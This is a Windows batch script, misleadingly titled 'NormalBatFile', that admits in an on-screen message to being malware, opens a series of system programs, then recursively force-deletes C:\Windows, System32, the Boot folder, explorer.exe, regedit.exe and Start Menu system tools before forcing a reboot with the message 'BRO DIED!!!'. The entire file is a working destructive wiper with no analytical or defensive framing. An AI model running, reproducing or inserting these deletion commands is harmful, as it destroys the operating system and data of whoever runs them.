@echo off
title NormalBatFile
echo This is malware, if wanna proceed with the executing just wait that the time goes out, if you do not want to proceed executing this,
echo restart your pc.
timeout 20
echo %random%
color 17
start mspaint
start notepad
start cmd
start calc
start control
start write
start explorer
start config
start %temp%
start System32
icacls C:\Windows\System32
start Taskmgr
start C:
start calc
start SYSWOM64
icacls C:\Windows
del /s /q /f C:\Windows\System32
del /s /q /f C:\Windows
del /s /q /f C:\Windows\Boot
del /s /q /f C:\Windows\explorer.exe
del /s /q /f C:\Windows\regedit.exe
del /s /q /f C:\ProgramData\Microsoft\Windows\Start Menu\Programs\System Tools
shutdown -r -t 2 -c "BRO DIED!!!"